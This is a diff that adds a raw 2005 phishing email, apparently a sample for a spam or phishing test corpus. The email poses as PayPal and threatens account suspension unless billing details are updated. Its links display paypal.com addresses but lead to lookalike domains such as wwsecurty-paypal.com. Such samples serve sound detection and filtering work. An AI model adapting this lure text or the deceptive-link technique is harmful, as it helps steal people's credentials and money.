@@ -1,0 +1,176 @@
+Return-Path: <nobody@lwf.ladot.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+	by naughty.example.com (Postfix) with ESMTP id 006115370FE
+	for <nobody@login.example.com>; Sat, 26 Nov 2005 11:40:09 -0500 (EST)
+Received: from mail1.example.com (localhost.example.com [127.0.0.1])
+	by mail1.example.com (Postfix) with ESMTP id CD9616CCE2A
+	for <nobody@example.com>; Sat, 26 Nov 2005 11:40:07 -0500 (EST)
+Received: from relay02.active24.nl (relay02.active24.nl [217.22.66.37])
+	by mail1.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Sat, 26 Nov 2005 11:40:07 -0500 (EST)
+Received: from lwf.ladot.com (lwf.active24.nl [217.22.64.72])
+	by relay02.active24.nl (Postfix) with ESMTP id 71C4E485D2
+	for <nobody@example.com>; Sat, 26 Nov 2005 15:53:58 +0100 (CET)
+Received: (from nobody@localhost)
+	by lwf.ladot.com (8.11.6/8.11.6) id jAQGd4B22287;
+	Sat, 26 Nov 2005 17:39:04 +0100
+Date: Sat, 26 Nov 2005 17:39:04 +0100
+Message-Id: <200511261639.jAQGd4B22287@lwf.ladot.com>
+To: nobody@example.com
+Subject: Your Paypal Account.
+From: Paypal <service@paypal.com>
+Reply-To: service@paypal.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: **
+X-Spam-Status: No, score=2.0 required=5.0 tests=HTML_80_90,HTML_MESSAGE,
+	HTML_MIME_NO_HTML_TAG,MIME_HTML_ONLY,RAZOR2_CF_RANGE_51_100,
+	RAZOR2_CHECK autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  0.1 HTML_80_90 BODY: Message is 80% to 90% HTML
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+	*  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 38
+
+<body>
+<style>
+BODY, TD
+{font-family:verdana,arial,helvetica,sans-serif;font-size:12px;color:#000000;}
+LI
+{line-height:120%;}
+UL.smallBorder
+{;}
+LI.smallBorderLi
+{;}
+UL.Narrow
+{;}
+HR.dotted
+{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bottom:2px dotted #ccc;}
+.smallEmphasis
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;font-weight:bold;color:#000000;}
+.serifBig
+{font-family:serif;font-size:20px;font-weight:bold;color:#000000;}
+.serif
+{font-family:serif;font-size:16px;color:#000000;}
+.sansSerif
+{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;color:#000000;}
+.heading
+{font-family:verdana,arial,helvetica,sans-serif;font-size:18px;font-weight:bold;color:#003366;}
+.subHeadingEoa
+{font-family:verdana,arial,helvetica,sans-serif;font-size:15px;font-weight:bold;color:#000000;}
+.subHeading
+{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;font-weight:bold;color:#003366;}
+.sidebarText
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#003366;}
+.sidebarTextBold
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;font-weight:bold;color:#003366;}
+.xptFooter
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#aaaaaa;}
+.button
+{font-size:13px;font-family:verdana,arial,helvetica,sans-serif;font-weight:400;border-style:outset;color:#000000;background-color:#cccccc;}
+.smaller
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#000000;}
+.smallerSidebar
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#003366;}
+.emphasis
+{font-weight:700;}
+table#invoice, table#invoice_controls, table#invoice_note
+{width:600px;}
+table#invoice_note
+{;}
+table#invoice_controls
+{text-align:right;}
+table#invoice
+{border-collapse:collapse;border:1px solid #aaa;}
+table#invoice td
+{font-size:11px;border:1px solid #ccc;padding:2px;}
+table#invoice td.field_label_right, table#invoice td.field_label_right_error
+{font-weight:bold;text-align:right;}
+table#invoice td.field_label_right_error, table#invoice td.field_label_error
+{color:red;}
+table#invoice tr.title td
+{font-weight:bold;line-height:20px;text-align:left;background-color:#ccddee;}
+table#invoice input.readonly
+{border:0;text-align:right;}
+table#invoice input.readonly_currency
+{border:0;width:10px;}
+.field_error, .field_error input.readonly_currency
+{background-color:#FF3333;}
+.currency_highlight
+{background-color:#ffffcc;}
+.tax
+{font-weight:400;float:left;}
+table#invoice td span.curr
+{float:left;}
+table#invoice td.currency
+{border-right:1px solid #fff;}
+table#invoice td.calc
+{font-weight:bold;text-align:right;}
+.inlineBlue
+{color:#00f;}
+.small
+{font-size:11px;font-weight:400;}
+HR.solid
+{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bottom:2px solid #999;}
+.large
+{font-size:17px;}
+.smallVerdanaGrey
+{font-family:verdana;font-size:10px;color:#999999;}
+.smallVerdana
+{font-family:verdana;font-size:10px;color:#000000;}
+.smallArial
+{font-family:arial;font-size:13px;}
+.smallArialBlue
+{font-family:verdana;font-size:9px;color:#0000FF;}
+.smallVerdanaGreen
+{font-family:verdana;font-size:10px;color:#666666;}
+.smaller
+{font-size:10px;color:gray;}
+.larger
+{font-size:18px;font-family:arial;font-weight:600;}
+.longTableValue
+{word-break:break-all;}
+.longSideBarText
+{width:190px;word-break:break-all;}
+</style>
+<div>
+<table align=center border=0 cellpadding=0 cellspacing=0 width=600><tr valign=top><td><a href="http://www.paypal.com.cgi-bin-webscr.net/webscr/cmd/login_submit/"><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border=0 alt=PayPal></a></td></tr></table><table align=center border=0 cellpadding=0 cellspacing=0 width="100%"><tr><td background="http://images.paypal.com/en_US/i/scr/bg_clk.gif" width="100%"><img alt="" border=0 height=29 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1></td></tr><tr><td><img alt="" border=0 height=10 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1></td></tr></table><table align=center border=0 cellpadding=0 cellspacing=0 width=600><tr><td></tr></table><table align=center border=0 cellpadding=0 cellspacing=0 width=600><tr valign=top><td width="100%"><table align=right bgcolor="#cccccc" border=0 cellpadding=1 cellspacing=0 width=190><tr><td><table align=center bgcolor="#ffffff" border=0 cellpadding=0 cellspacin
+ g=0 width="100%"><tr><td><table align=center bgcolor="#eeeeee" border=0 cellpadding=5 cellspacing=0 width="100%"><tr><td align=center><span class=sideBarTextBold>Protect Your Account Info</span></td></tr></table><table align=center border=0 cellpadding=5 cellspacing=0 width="100%"><tr><td class=sideBarText bgcolor="#ffffff">Make sure you never provide your password to fraudulent websites.<br><br>
+PayPal will never ask you to enter your password in an email.<br>
+<br>For more information on protecting yourself from fraud, please review our Security Tips  at  <span class=longSideBarText>https://www.paypal.com/us/securitytips</span><br><img alt="" border=0 height=5 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1></td></tr></table></td></tr></table><table align=center bgcolor="#ffffff" border=0 cellpadding=0 cellspacing=0 width="100%"><tr><td><table align=center bgcolor="#eeeeee" border=0 cellpadding=5 cellspacing=0 width="100%"><tr><td align=center class=sideBarTextBold>Protect Your Password</td></tr></table><table align=center border=0 cellpadding=5 cellspacing=0 width="100%"><tr><td class=sideBarText>You should <span class=emphasis>never</span> give your PayPal password to anyone, including PayPal employees.<br><img alt="" border=0 height=5 src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1></td></tr></table></td></tr></table></td></tr><tr><td></tr></table>
+<span class=heading>Update Your Information <br>
+</span>
+<hr class=dotted><p>It has come to our attention that your PayPal billing information are out of date. This require you to update your billing information as soon as possible.<br>
+    This billing update is also a new PayPal security statement which goes according to the established norms on our terms of service (TOS) to reduce the instance of fraud on our website.<br>
+    <br>
+    Please update your records on or before <strong>Nov 29, 2005</strong>. A failure to update your records may result on a suspension of your account.</p>
+<p>To update your PayPal records click on the following link:<br>
+	<a href="http://www.paypal.com/us/"><table><tr><td>
+	<a href="http://www.wwsecurty-paypal.com/www.paypal.com/signinDQAAAG4AAADZ3XcFqGpyVexZXlp42ILckL16sz8USkBXj2StlL2lq74RZi-ZN0FOU7by8X_Jh2pn3AEECKZo8TFq0WyJ8IIGI0qgARKV_pf27Z0dSdpkBPWqiQQcY0sJJ8txaw-ifZToKQeM9OX1D4LVt4HygyKB.html">http://www.paypal.com/us/
+	</td></tr></table></a>
+</p>
+<p>This new security statement will helps us continue to offer PayPal as a secure and cost-effective payment service. We appreciate your cooperation and assistance.<br>
+</p>
+<p>Sincerely,<br>
+  The PayPal Team</p>
+<hr class=dotted>
+
+<span class=xptFooter>Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, <a href="http://www.paypal.com.cgi-bin-webscr.net/webscr/cmd/login_submit/">log in </a> to your PayPal account and choose the Help link located in the top right corner of any PayPal page. <br>
+  <br>
+</span><span class=xptFooter>PayPal Email ID PP295</span></td>
+</tr></table>
+</div>
+
+</body>
+
